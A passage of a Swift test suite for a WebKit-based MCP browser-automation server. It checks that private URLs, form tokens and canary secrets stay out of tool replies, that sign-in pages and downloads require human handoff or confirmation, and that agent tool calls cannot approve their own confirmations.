      server, id: 3, name: "browser_inspect_element",
      arguments: [
        "session_id": .string(sessionID),
        "observation_id": .string(try string(structured["observationID"])),
        "element_id": .string(try string(row["elementID"])),
      ])
    let inspection = try object(try object(inspected["result"])["structuredContent"])
    #expect(
      try object(inspection["stableAttributes"])["href"]
        == .string("https://fixture.invalid/tokens?team=<redacted>"))
    #expect(inspection["arbitrarySelectorSupported"] == .bool(false))
    #expect(inspection["javascriptEvaluationSupported"] == .bool(false))

    _ = try await toolCall(
      server, id: 4, name: "browser_observe",
      arguments: ["session_id": .string(sessionID), "compact": .bool(true)])
    let stale = try await toolCall(
      server, id: 5, name: "browser_inspect_element",
      arguments: [
        "session_id": .string(sessionID),
        "observation_id": .string(try string(structured["observationID"])),
        "element_id": .string(try string(row["elementID"])),
      ])
    #expect(try object(stale["error"])["code"] == .int(-32602))
  }

  @Test("Authentication origins expose only a sanitized handoff requirement")
  func authenticationOriginPolicy() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(opened["result"])["structuredContent"])["session_id"])
    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    let secret = "server-query-state-must-not-escape"
    _ = try await runtime.loadHTML(
      """
      <div role="progressbar"></div>
      <form hidden><input name="csrfToken" value="hidden-server-secret"></form>
      """,
      baseURL: URL(string: "https://idmsa.apple.com/IDMSWebAuth/signin?state=\(secret)"),
      timeout: .seconds(3),
      quietWindow: .milliseconds(40)
    )

    let status = try await toolCall(
      server,
      id: 2,
      name: "browser_session",
      arguments: ["operation": .string("status"), "session_id": .string(sessionID)]
    )
    let statusContent = try object(try object(status["result"])["structuredContent"])
    #expect(statusContent["currentURL"] == .string("https://idmsa.apple.com"))

    for (offset, name) in [
      "browser_observe",
      "browser_read_text",
      "browser_capture",
      "browser_scroll",
      "element_scroll_into_view",
      "browser_act",
      "browser_download",
      "browser_upload",
      "browser_fill_siliconpass",
    ].enumerated() {
      let response = try await toolCall(
        server,
        id: Int64(3 + offset),
        name: name,
        arguments: ["session_id": .string(sessionID)]
      )
      let result = try object(response["result"])
      #expect(result["isError"] == .bool(true))
      let structured = try object(result["structuredContent"])
      #expect(structured["status"] == .string("authentication_origin_requires_human_handoff"))
      #expect(structured["origin"] == .string("https://idmsa.apple.com"))
      #expect(structured["auth_ui_state"] == .string("auth_ui_not_ready"))
      #expect(structured["control_state"] == .string("human_controlled"))
      #expect(structured["selected_backend"] == .string("native_webkit"))
      #expect(structured["required_internal_backend"] == .string("native_handoff"))
      #expect(structured["backend_transition"] == .string("human_handoff_required"))
      #expect(structured["session_transfer_supported"] == .bool(false))
      #expect(structured["credential_transfer_supported"] == .bool(false))
      let encoded = String(decoding: try JSONEncoder().encode(result), as: UTF8.self)
      #expect(!encoded.contains(secret))
      #expect(!encoded.contains("hidden-server-secret"))
      #expect(!encoded.contains("IDMSWebAuth"))
    }
  }

  @Test("WebAuthn controls report a full-browser recovery path")
  func webAuthnControlReportsFullBrowserRecovery() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(opened["result"])["structuredContent"])["session_id"])
    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    _ = try await runtime.loadHTML(
      "<div>Verify with a security key</div>",
      baseURL: URL(string: "https://dash.cloudflare.com/two-factor"),
      timeout: .seconds(3),
      quietWindow: .milliseconds(40)
    )

    let response = try await toolCall(
      server,
      id: 2,
      name: "browser_observe",
      arguments: ["session_id": .string(sessionID)]
    )
    let result = try object(response["result"])
    #expect(result["isError"] == .bool(true))
    let structured = try object(result["structuredContent"])
    #expect(structured["status"] == .string("full_browser_required"))
    #expect(structured["origin"] == .string("https://dash.cloudflare.com"))
    #expect(structured["required_internal_backend"] == .string("safari_compatibility"))
    #expect(
      structured["recommended_user_action"]
        == .string("continue_in_safari_or_another_full_browser"))
    #expect(structured["session_transfer_supported"] == .bool(false))
    #expect(structured["credential_transfer_supported"] == .bool(false))
  }

  @Test(
    "Manual Safari fallback works for ordinary origins and respects rejection",
    arguments: [false, true])
  func safariCompatibilityOrdinaryOrigin(approved: Bool) async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    let url = try #require(
      URL(string: "https://hpanel.fixture.invalid/private?token=SAFARI-PRIVATE-CANARY"))
    _ = try await runtime.loadHTML(
      "<p>Local panel fixture</p>", baseURL: url,
      timeout: .seconds(5), quietWindow: .milliseconds(40))
    #expect(runtime.authenticationRestrictionStatus() == nil)
    let safari = SafariCompatibilityPresenterStub()
    let presenter = ConfirmationPresenterStub(responses: [approved])
    let server = WebKitMCPServer(
      registry: registry, confirmationPresenter: presenter,
      safariCompatibilityPresenter: safari)
    let response = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "operation": .string("compatibility_start"),
        "session_id": .string(handle.rawValue.uuidString),
      ])
    let result = try object(try object(response["result"])["structuredContent"])
    #expect(result["opened"] == .bool(approved))
    #expect(presenter.requests.count == 1)
    #expect(!presenter.requests[0].message.contains("SAFARI-PRIVATE-CANARY"))
    #expect(safari.openedURLs == (approved ? [url] : []))
    #expect(
      !String(decoding: try JSONEncoder().encode(response), as: UTF8.self).contains(
        "SAFARI-PRIVATE-CANARY"))
    #expect(runtime.interactionControlState() == .agentControlled)
  }

  @Test("Session diagnosis returns only structural loading hints")
  func sessionLoadDiagnosis() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<input type=password value=LOAD-DIAG-PRIVATE-CANARY>",
      baseURL: URL(string: "https://fixture.invalid/private?token=LOAD-DIAG-PRIVATE-CANARY"),
      timeout: .seconds(5), quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(registry: registry)
    let response = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "operation": .string("diagnose"), "session_id": .string(handle.rawValue.uuidString),
      ])
    let result = try object(try object(response["result"])["structuredContent"])
    #expect(try object(result["diagnostics"])["documentReadyState"] == .string("complete"))
    #expect(result["origin"] == .string("https://fixture.invalid"))
    #expect(
      !String(decoding: try JSONEncoder().encode(response), as: UTF8.self).contains(
        "LOAD-DIAG-PRIVATE-CANARY"))
  }

  @Test("Safari compatibility handoff keeps the private URL outside MCP")
  func safariCompatibilityHandoffKeepsPrivateURLLocal() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    let privateState = "private-query-state"
    _ = try await runtime.loadHTML(
      "<div>Verify with a security key</div>",
      baseURL: URL(
        string: "https://dash.cloudflare.com/two-factor?state=\(privateState)"),
      timeout: .seconds(3),
      quietWindow: .milliseconds(40)
    )
    let confirmation = ConfirmationPresenterStub(responses: [true])
    let safari = SafariCompatibilityPresenterStub()
    let server = WebKitMCPServer(
      registry: registry,
      confirmationPresenter: confirmation,
      safariCompatibilityPresenter: safari
    )

    let response = try await toolCall(
      server,
      id: 1,
      name: "browser_session",
      arguments: [
        "operation": .string("compatibility_start"),
        "session_id": .string(handle.rawValue.uuidString),
      ]
    )
    let result = try object(response["result"])
    #expect(result["isError"] == nil)
    let structured = try object(result["structuredContent"])
    #expect(structured["status"] == .string("safari_compatibility_handoff_started"))
    #expect(structured["safari_control_supported"] == .bool(false))
    #expect(structured["mcp_resume_supported"] == .bool(false))
    #expect(structured["manual_web_completion_required"] == .bool(true))
    #expect(try string(structured["instructions"]).contains("cannot observe or control Safari"))
    #expect(structured["origin"] == .string("https://dash.cloudflare.com"))
    #expect(structured["handoff_backend"] == .string("safari"))
    #expect(structured["opened"] == .bool(true))
    #expect(structured["session_transfer_supported"] == .bool(false))
    #expect(structured["cookie_transfer_supported"] == .bool(false))
    #expect(structured["credential_transfer_supported"] == .bool(false))
    #expect(safari.openedURLs.count == 1)
    #expect(safari.openedURLs.first?.query == "state=\(privateState)")
    #expect(confirmation.requests.count == 1)
    #expect(!confirmation.requests[0].message.contains(privateState))
    #expect(confirmation.requests[0].message.contains("https://dash.cloudflare.com"))
    #expect(!confirmation.requests[0].message.contains("(restriction.origin)"))

    let status = try await toolCall(
      server,
      id: 2,
      name: "browser_session",
      arguments: [
        "operation": .string("status"),
        "session_id": .string(handle.rawValue.uuidString),
      ]
    )
    let statusContent = try object(try object(status["result"])["structuredContent"])
    #expect(statusContent["safari_compatibility_handoff_active"] == .bool(true))

    let encoded = String(decoding: try JSONEncoder().encode(result), as: UTF8.self)
    #expect(!encoded.contains(privateState))
    #expect(!encoded.contains("two-factor"))
  }

  @Test("Safari compatibility is an explicit fallback for an unusable Apple handoff")
  func safariCompatibilityFallbackFromNativeAppleHandoff() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    let privateState = "apple-private-query-state"
    _ = try await runtime.loadHTML(
      "<footer>Privacy Terms</footer>",
      baseURL: URL(
        string: "https://idmsa.apple.com/IDMSWebAuth/signin?state=\(privateState)"),
      timeout: .seconds(3),
      quietWindow: .milliseconds(40)
    )
    #expect(runtime.authenticationRestrictionStatus()?.classification == .authUINotReady)
    try runtime.requestHumanHandoff()
    try runtime.beginHumanControl(presentWindow: false)
    let confirmation = ConfirmationPresenterStub(responses: [true])
    let safari = SafariCompatibilityPresenterStub()
    let server = WebKitMCPServer(
      registry: registry,
      presentHumanWindows: false,
      confirmationPresenter: confirmation,
      safariCompatibilityPresenter: safari
    )

    let response = try await toolCall(
      server,
      id: 1,
      name: "browser_session",
      arguments: [
        "operation": .string("compatibility_start"),
        "session_id": .string(handle.rawValue.uuidString),
      ]
    )
    let result = try object(response["result"])
    #expect(result["isError"] == nil)
    let structured = try object(result["structuredContent"])
    #expect(structured["status"] == .string("safari_compatibility_handoff_started"))
    #expect(structured["fallback_from"] == .string("auth_ui_not_ready"))
    #expect(structured["native_handoff_remains_active"] == .bool(true))
    #expect(safari.openedURLs.first?.query == "state=\(privateState)")
    let encoded = String(decoding: try JSONEncoder().encode(result), as: UTF8.self)
    #expect(!encoded.contains(privateState))
    #expect(!encoded.contains("IDMSWebAuth"))
  }

  @Test("Status exposes safe authentication health and a scoped handoff focus operation")
  func authenticationStatusAndHandoffFocus() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<footer>Privacy Terms</footer>",
      baseURL: URL(string: "https://idmsa.apple.com/private?state=secret"),
      timeout: .seconds(3),
      quietWindow: .milliseconds(40)
    )
    let server = WebKitMCPServer(registry: registry, presentHumanWindows: false)
    let sessionID = JSONValue.string(handle.rawValue.uuidString)
    let unavailableResponse = try await toolCall(
      server, id: 0, name: "browser_session",
      arguments: ["operation": .string("handoff_focus"), "session_id": sessionID])
    let unavailableResult = try object(unavailableResponse["result"])
    #expect(unavailableResult["isError"] == .bool(true))
    let unavailable = try object(unavailableResult["structuredContent"])
    #expect(unavailable["status"] == .string("handoff_focus_unavailable"))
    #expect(unavailable["surface_presented"] == .bool(false))

    try runtime.requestHumanHandoff()
    try runtime.beginHumanControl(presentWindow: false)

    let statusResponse = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: ["operation": .string("status"), "session_id": sessionID])
    let status = try object(try object(statusResponse["result"])["structuredContent"])
    #expect(status["human_control_surface_presented"] == .bool(false))
    #expect(status["safari_compatibility_available"] == .bool(true))
    let auth = try object(status["authentication_restriction"])
    #expect(auth["origin"] == .string("https://idmsa.apple.com"))
    #expect(auth["auth_ui_state"] == .string("auth_ui_not_ready"))
    let health = try object(auth["ui_health"])
    #expect(auth["ui_health_is_live"] == .bool(false))
    #expect(
      auth["ui_health_scope"] == .string("last_navigation_settlement_before_handoff"))
    #expect(health["documentComplete"] == .bool(true))
    #expect(health["hasRenderedFooter"] == .bool(true))
    #expect(health["hasRenderedNonFooterContent"] == .bool(false))
    let encodedStatus = String(decoding: try JSONEncoder().encode(status), as: UTF8.self)
    #expect(!encodedStatus.contains("state=secret"))
    #expect(!encodedStatus.contains("/private"))

    let focusResponse = try await toolCall(
      server, id: 2, name: "browser_session",
      arguments: ["operation": .string("handoff_focus"), "session_id": sessionID])
    let focus = try object(try object(focusResponse["result"])["structuredContent"])
    #expect(focus["status"] == .string("human_control_surface_focused"))
    #expect(focus["surface_presented"] == .bool(true))
    #expect(runtime.humanControlSurfaceIsPresented)
  }

  @Test("Cross-origin redirects return only sanitized origins")
  func redirectRequiresHumanApprovalResult() throws {
    let server = try WebKitMCPServer()
    let result = try object(
      server.redirectApprovalResult(
        fromOrigin: "https://developer.apple.com",
        toOrigin: "https://idmsa.apple.com",
        modern: true
      ))
    #expect(result["isError"] == .bool(true))
    let structured = try object(result["structuredContent"])
    #expect(structured["status"] == .string("redirect_requires_human_approval"))
    #expect(structured["from_origin"] == .string("https://developer.apple.com"))
    #expect(structured["to_origin"] == .string("https://idmsa.apple.com"))
    let encoded = String(decoding: try JSONEncoder().encode(result), as: UTF8.self)
    #expect(!encoded.contains("IDMSWebAuth"))
    #expect(!encoded.contains("?"))
  }

  @Test("Authentication navigation approval omits path and query")
  func authenticationNavigationApprovalIsSanitized() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let server = WebKitMCPServer(registry: registry)
    let secret = "approval-query-state-must-not-escape"
    let prepared = try await toolCall(
      server,
      id: 1,
      name: "browser_navigate",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "url": .string(
          "https://idmsa.apple.com/IDMSWebAuth/signin?state=\(secret)"),
        "approval_mode": .string("mcp"),
      ]
    )
    let result = try object(prepared["result"])
    let requests = try object(result["inputRequests"])
    let confirmation = try object(requests["confirmation"])
    let message = try string(try object(confirmation["params"])["message"])
    #expect(message.contains("https://idmsa.apple.com"))
    #expect(!message.contains("IDMSWebAuth"))
    #expect(!message.contains(secret))
    #expect(!message.contains("?state="))
  }

  @Test("Session state travels through an explicit tool argument")
  func explicitSessionHandle() async throws {
    let server = try WebKitMCPServer()
    let profiles = try await toolCall(
      server, id: 0, name: "browser_session", arguments: ["operation": .string("profiles")])
    let profileResult = try object(try object(profiles["result"])["structuredContent"])
    #expect(try array(profileResult["profiles"]).contains(.string("default")))
    #expect(profileResult["contains_credentials"] == .bool(false))
    let opened = try await toolCall(
      server,
      id: 1,
      name: "browser_session",
      arguments: ["operation": .string("open"), "profile_id": .string("default")])
    let openResult = try object(try object(opened["result"])["structuredContent"])
    let sessionID = try string(openResult["session_id"])
    #expect(UUID(uuidString: sessionID) != nil)
    #expect(openResult["profile_id"] == .string("default"))
    #expect(openResult["execution_policy"] == .string("auto"))
    #expect(openResult["selected_backend"] == .string("native_webkit"))

    let status = try await toolCall(
      server,
      id: 2,
      name: "browser_session",
      arguments: ["operation": .string("status"), "session_id": .string(sessionID)]
    )
    let statusResult = try object(try object(status["result"])["structuredContent"])
    #expect(statusResult["sessionID"] == .string(sessionID))
    #expect(statusResult["selected_backend"] == .string("native_webkit"))

    _ = try await toolCall(
      server,
      id: 3,
      name: "browser_session",
      arguments: ["operation": .string("close"), "session_id": .string(sessionID)]
    )
    let afterClose = try await toolCall(
      server,
      id: 4,
      name: "browser_session",
      arguments: ["operation": .string("status"), "session_id": .string(sessionID)]
    )
    #expect(try object(afterClose["result"])["isError"] == .bool(true))
  }

  @Test("Native confirmation status is observable and cancellation is explicit")
  func nativeConfirmationStatusAndCancel() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let presenter = ConfirmationPresenterStub(
      responses: [], state: .pending)
    let server = WebKitMCPServer(
      registry: registry, confirmationPresenter: presenter)

    let status = try await toolCall(
      server,
      id: 1,
      name: "browser_session",
      arguments: [
        "operation": .string("status"),
        "session_id": .string(handle.rawValue.uuidString),
      ])
    let statusResult = try object(try object(status["result"])["structuredContent"])
    #expect(
      statusResult["native_confirmation_state"]
        == .string("pending_native_confirmation"))
    #expect(statusResult["native_confirmation_cancel_available"] == .bool(true))

    let cancelled = try await toolCall(
      server,
      id: 2,
      name: "browser_session",
      arguments: [
        "operation": .string("confirmation_cancel"),
        "session_id": .string(handle.rawValue.uuidString),
      ])
    let cancelledResult = try object(
      try object(cancelled["result"])["structuredContent"])
    #expect(cancelledResult["cancel_requested"] == .bool(true))
    #expect(presenter.state == .idle)
  }

  @Test("MCP confirmation focus is session/request bound and cannot dispatch or approve")
  func nativeConfirmationFocusIsBound() async throws {
    let registry = try WebKitSessionRegistry(maximumSessions: 2)
    let handle = try registry.open()
    let other = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<h1>Initial</h1><button onclick=\"document.querySelector('h1').textContent='Changed'\">Change</button>",
      baseURL: URL(string: "https://focus.fixture.invalid"), timeout: .seconds(15),
      quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [false])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    defer { presenter.beforeResponse = nil }
    let session = JSONValue.string(handle.rawValue.uuidString)
    presenter.beforeResponse = {
      presenter.state = .pending
      let requestID = UUID()
      presenter.presentationReceipt = ConfirmationPresentationReceipt(
        requestID: requestID, helperPID: 42, phase: .sampled, monotonicNanoseconds: 1,
        windowNumber: 7, windowVisible: true, appKitVisible: true, keyWindow: false,
        onActiveSpace: true, intersectsScreen: true)
      for (index, selectedSession, selectedRequest, expected) in [
        (10, JSONValue.string(other.rawValue.uuidString), requestID, false),
        (11, session, UUID(), false), (12, session, requestID, true),
      ] {
        let reply = try? await toolCall(
          server, id: Int64(index), name: "browser_session",
          arguments: [
            "operation": .string("confirmation_focus"), "session_id": selectedSession,
            "confirmation_request_id": .string(selectedRequest.uuidString),
          ])
        let content = try? object(try object(reply?["result"])["structuredContent"])
        #expect(content?["focus_requested"] == .bool(expected))
        #expect(content?["approval_granted"] == .bool(false))
        #expect(content?["action_dispatched"] == .bool(false))
        #expect(content?["timeout_extended"] == .bool(false))
      }
      #expect(presenter.focusRequests == [requestID])
    }
    let reply = try await toolCall(
      server, id: 1, name: "browser_observe", arguments: ["session_id": session])
    let observed = try object(try object(reply["result"])["structuredContent"])
    _ = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": session, "observation_id": observed["observationID"]!,
        "element_id": .string(try elementID(in: observed, named: "Change")),
        "operation": .string("click"),
        "idempotency_key": .string("focus-declined-639"),
        "postcondition": .object(["type": .string("heading_equals"), "value": .string("Changed")]),
      ])
    #expect(presenter.requests.count == 1)
    #expect(
      try await runtime.webView.evaluateJavaScript("document.querySelector('h1').textContent")
        as? String == "Initial")
  }

  @Test(
    "Timeout diagnostics never invent presentation or navigate",
    arguments: [NativeConfirmationOutcome.timedOut, .queueTimedOut])
  func confirmationTimeoutDoesNotInventPresentation(outcome: NativeConfirmationOutcome) async throws
  {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    let presenter = ConfirmationPresenterStub(responses: [])
    presenter.forcedOutcome = outcome
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let response = try await toolCall(
      server, id: 1, name: "browser_navigate",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "url": .string("https://fixture.invalid/not-dispatched"),
      ])
    let result = try object(response["result"])
    #expect(result["isError"] == .bool(true))
    let content = try object(result["structuredContent"])
    #expect(content["confirmation_outcome"] == .string(outcome.rawValue))
    #expect(content["confirmation_presented"] == (outcome == .queueTimedOut ? .bool(false) : .null))
    #expect(content["confirmation_presentation"] == .null)
    #expect(runtime.navigationAuditEventCount() == 0)
    #expect(presenter.requests.first?.title.contains(runtime.humanControlSessionLabel) == true)
  }

  @Test(
    "Download confirmation distinguishes refusal from delivery failure",
    arguments: [
      NativeConfirmationOutcome.declined, .timedOut, .queueTimedOut, .cancelled, .failed, .hidden,
    ])
  func downloadConfirmationOutcomeIsHonest(outcome: NativeConfirmationOutcome) async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button>Download</button>",
      baseURL: URL(string: "https://fixture.invalid/export"), timeout: .seconds(3),
      quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [])
    presenter.forcedOutcome = outcome
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let response = try await toolCall(
      server, id: 1, name: "browser_download",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("local-download-once"),
        "url": .string("https://fixture.invalid/export.json"),
      ])
    let result = try object(response["result"])
    let content = try object(result["structuredContent"])
    #expect(result["isError"] == .bool(true))
    #expect(
      content["code"]
        == .string(outcome == .declined ? "declined_by_user" : "confirmation_unavailable"))
    if outcome != .declined {
      #expect(content["confirmation_outcome"] == .string(outcome.rawValue))
    }
    #expect(runtime.navigationAuditEventCount() == 1)
  }

  @Test("A refused download reports bounded dispatch stage without claiming a click")
  func refusedDownloadHasStageEvidence() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button aria-label='Export fixture'>Export fixture</button><div style='position:fixed;inset:0;background:white'>Cover</div>",
      baseURL: URL(string: "https://fixture.invalid/covered"), timeout: .seconds(3),
      quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(
      registry: registry, confirmationPresenter: ConfirmationPresenterStub(responses: [true]))
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let response = try await toolCall(
      server, id: 2, name: "browser_download",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("covered-download-only"),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try elementID(in: observation, named: "Export fixture")),
      ])
    let result = try object(response["result"])
    #expect(result["isError"] == .bool(true))
    let content = try object(result["structuredContent"])
    #expect(content["code"] == .string("target_not_actionable"))
    #expect(content["native_dispatch_attempted"] == .bool(false))
    #expect(content["native_gesture_verified"] == .bool(false))
    #expect(content["download_started"] == .bool(false))
    #expect(content["automatic_retry_allowed"] == .bool(false))
  }

  @Test("Configuration canaries reach no observation, text, inspector or native confirmation bytes")
  func configurationPrivacyOnWire() async throws {
    let canary = "synthetic-wire-secret-canary-638-not-a-key"
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <h1>Configuration</h1><table><tr aria-label='CLOUDKIT_API_TOKEN \(canary)'>
      <td>CLOUDKIT_API_TOKEN</td><td>\(canary)</td>
      <td><button onclick="document.querySelector('h1').textContent='Public result'">Edit</button></td>
      </tr></table>
      """, baseURL: URL(string: "https://privacy.fixture.invalid"),
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let session = JSONValue.string(handle.rawValue.uuidString)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": session, "compact": .bool(false)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    #expect(
      observation["observation_completeness_scope"] == .string("discovered_collector_results_only"))
    let target = try elementID(in: observation, named: "Edit")
    let inspected = try await toolCall(
      server, id: 2, name: "browser_inspect_element",
      arguments: [
        "session_id": session, "observation_id": observation["observationID"]!,
        "element_id": .string(target),
      ])
    let text = try await toolCall(
      server, id: 3, name: "browser_read_text",
      arguments: ["session_id": session])
    let acted = try await toolCall(
      server, id: 4, name: "browser_act",
      arguments: [
        "session_id": session, "observation_id": observation["observationID"]!,
        "element_id": .string(target), "operation": .string("click"),
        "idempotency_key": .string("privacy-wire-only-638"),
        "approval_mode": .string("native"),
        "postcondition": .object([
          "type": .string("heading_equals"), "value": .string("Public result"),
        ]),
      ])
    #expect(try object(acted["result"])["isError"] != .bool(true))
    #expect(presenter.requests.count == 1)
    for reply in [observed, inspected, text, acted] {
      #expect(!String(decoding: try JSONEncoder().encode(reply), as: UTF8.self).contains(canary))
    }
    let request = try #require(presenter.requests.first)
    #expect(!request.message.contains(canary))
    _ = try await runtime.webView.evaluateJavaScript(
      "const field=document.createElement('input'); field.type='password'; field.name='password'; field.value='x'.repeat(65537); document.body.appendChild(field); null"
    )
    for (index, name) in ["browser_observe", "browser_read_text"].enumerated() {
      let refused = try await toolCall(
        server, id: Int64(5 + index), name: name,
        arguments: ["session_id": session])
      let result = try object(refused["result"])
      #expect(result["isError"] == .bool(true))
      let content = try object(result["structuredContent"])
      #expect(content["code"] == .string("privacy_scan_limit_exceeded"))
      #expect(content["automatic_retry_allowed"] == .bool(false))
      #expect(!String(decoding: try JSONEncoder().encode(refused), as: UTF8.self).contains(canary))
    }
  }

  @Test(
    "An explicit dialog scope supports a bounded wizard transition without global absence claims")
  func scopedDialogWizard() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <h1>Outside heading</h1>
      <div role='dialog' aria-label='Collection' id='wizard'>
        <h2>First step</h2><p>\(String(repeating: "Long public paragraph. ", count: 300))</p>
        <button onclick="document.querySelector('#wizard h2').textContent='Second step'">Continue</button>
      </div>
      """, baseURL: URL(string: "https://scope.fixture.invalid"),
      timeout: .seconds(15), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let session = JSONValue.string(handle.rawValue.uuidString)
    let fullReply = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": session])
    let full = try object(try object(fullReply["result"])["structuredContent"])
    #expect(full["observation_is_complete"] == .bool(false))
    // Only the paragraph text was cut; every element was discovered.
    #expect(full["observation_is_structurally_complete"] == .bool(true))
    let fullTarget = try elementID(in: full, named: "Continue")
    let globalTextRefused = try await toolCall(
      server, id: 10, name: "browser_act",
      arguments: [
        "session_id": session, "observation_id": full["observationID"]!,
        "element_id": .string(fullTarget), "operation": .string("click"),
        "idempotency_key": .string("global-text-refused-639"),
        "postcondition": .object([
          "type": .string("semantic_text_contains"), "value": .string("Second step"),
        ]),
      ])
    #expect(
      String(decoding: try JSONEncoder().encode(globalTextRefused), as: UTF8.self).contains(
        "postcondition_baseline_incomplete"))
    #expect(presenter.requests.isEmpty)
    let root = try elementID(in: full, named: "Collection")
    let scopedReply = try await toolCall(
      server, id: 2, name: "browser_observe",
      arguments: [
        "session_id": session, "scope_observation_id": full["observationID"]!,
        "scope_element_id": .string(root),
      ])
    let scoped = try object(try object(scopedReply["result"])["structuredContent"])
    #expect(scoped["aggregateTextOmitted"] == .bool(true))
    #expect(scoped["semantic_text_complete"] == .bool(false))
    #expect(scoped["observation_is_complete"] == .bool(true))
    #expect(
      scoped["observation_completeness_scope"] == .string("observed_dialog_collector_results_only"))
    let target = try elementID(in: scoped, named: "Continue")
    let textRefused = try await toolCall(
      server, id: 11, name: "browser_act",
      arguments: [
        "session_id": session, "observation_id": scoped["observationID"]!,
        "element_id": .string(target), "operation": .string("click"),
        "idempotency_key": .string("omitted-text-refused-639"),
        "postcondition": .object([
          "type": .string("semantic_text_contains"), "value": .string("Missing text"),
        ]),
      ])
    #expect(
      String(decoding: try JSONEncoder().encode(textRefused), as: UTF8.self).contains(
        "postcondition_baseline_incomplete"))
    #expect(presenter.requests.isEmpty)
    let acted = try await toolCall(
      server, id: 3, name: "browser_act",
      arguments: [
        "session_id": session, "observation_id": scoped["observationID"]!,
        "element_id": .string(target), "operation": .string("click"),
        "idempotency_key": .string("scoped-wizard-639"),
        "postcondition": .object([
          "type": .string("heading_equals"), "value": .string("Second step"),
        ]),
      ])
    #expect(try object(acted["result"])["isError"] != .bool(true))
    #expect(presenter.requests.count == 1)
    #expect(
      try await runtime.webView.evaluateJavaScript(
        "document.querySelector('#wizard h2').textContent") as? String == "Second step")
  }

  /// App Store Connect overflows the field bound on every page (sidebar, footer), so a
  /// target_absent claim was refused on every page. Cut text says nothing about
  /// whether a button still exists.
  @Test("Truncated field text alone does not refuse or weaken a target_absent claim")
  func truncatedTextStillVerifiesAbsence() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <h1>Privacy</h1><p>\(String(repeating: "Long public footer. ", count: 300))</p>
      <button onclick="this.remove()">OK</button>
      """,
      baseURL: URL(string: "https://truncated.fixture.invalid"),
      timeout: .seconds(15), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let session = JSONValue.string(handle.rawValue.uuidString)
    let reply = try await toolCall(
      server, id: 1, name: "browser_observe", arguments: ["session_id": session])
    let observation = try object(try object(reply["result"])["structuredContent"])
    #expect(observation["semanticTextTruncated"] == .bool(true))
    #expect(observation["observation_is_complete"] == .bool(false))
    #expect(observation["observation_is_structurally_complete"] == .bool(true))
    let target = try elementID(in: observation, named: "OK")
    let acted = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": session, "observation_id": observation["observationID"]!,
        "element_id": .string(target), "operation": .string("click"),
        "idempotency_key": .string("truncated-absence-639"),
